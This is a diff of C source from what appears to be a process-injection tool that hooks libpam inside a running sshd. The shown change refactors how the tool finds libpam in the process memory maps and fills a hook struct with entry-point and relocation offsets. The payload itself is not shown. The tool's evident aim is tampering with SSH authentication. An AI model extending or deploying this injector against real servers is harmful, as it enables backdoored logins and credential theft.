@@ -26,23 +26,6 @@ typedef struct {
     uint64_t cave;
 } hook_t;
 
-char *search_libpam_name(ignotum_maplist_t *map){
-    char *ret = NULL;
-    size_t i;
-
-    for(i=0; i<map->len; i++){
-        if(map->maps[i].pathname == NULL)
-            continue;
-
-        if(strstr(map->maps[i].pathname, "libpam.so")){
-            ret = map->maps[i].pathname;
-            break;
-        }
-    }
-
-    return ret;
-}
-
 void poison(hook_t *hook, pid_t pid){
     ignotum_mapinfo_t *pam = NULL, *sshd;
     ignotum_maplist_t map;
@@ -192,7 +175,7 @@ void banner(void){
 }
 
 int main(int argc, char **argv){
-    ignotum_maplist_t map;
+    ignotum_mapinfo_t map;
     char *sshd, *libpam;
 
     elf_t elf, pam;
@@ -217,14 +200,13 @@ int main(int argc, char **argv){
 
     printf("[+] sshd filename:    %s\n", sshd);
 
-    if(ignotum_getmaplist(&map, pid) <= 0){
-        printf("[-] failed to read maps\n");
+    if(ignotum_getbasemap(&map, pid, "*libpam.so*", 1)){
+        printf("[-] failed to get libpam filename\n");
         return 1;
     }
 
-    libpam = search_libpam_name(&map);
+    libpam = map.pathname;
     if(libpam == NULL){
-        printf("[-] failed to get libpam filename\n");
         return 1;
     }
     printf("[+] libpam filename:  %s\n", libpam);
@@ -254,11 +236,10 @@ int main(int argc, char **argv){
 
     hook.sshd = sshd;
     hook.entry_point = elf.header->e_entry;
-    hook.libpam = strdup(libpam);
+    hook.libpam = libpam;
     hook.st_value = rela.sym->st_value;
     hook.r_offset = rela.rel->r_offset;
 
-    free_ignotum_maplist(&map);
     free_elf(&elf);
     free_elf(&pam);
 
